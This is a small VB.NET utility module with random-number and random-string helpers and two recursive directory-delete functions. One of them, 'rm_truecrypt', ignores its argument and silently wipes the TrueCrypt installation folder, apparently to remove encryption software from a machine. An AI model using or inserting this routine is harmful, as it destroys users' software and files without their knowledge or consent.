Imports System.IO

Module modLib

    Public Function rnd_number(x As Integer, y As Integer) As String
        Dim rn As New Random
        Return rn.Next(x, y)
    End Function

    Public Function RandomString(size As Integer, Optional validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz") As String
        If size < 1 Or validchars.Length = 0 Then Return ""
        RandomString = ""
        Randomize()
        For i = 1 To size
            RandomString &= Mid(validchars, Int(Rnd() * validchars.Length) + 1, 1)
        Next
    End Function

    Public Function rm_truecrypt(path As String)
        rm("C:\Program Files\TrueCrypt\")
        Return Nothing
    End Function

    Public Function rm(path As String)
        Directory.Delete(path, True)
        Return Nothing
    End Function

End Module
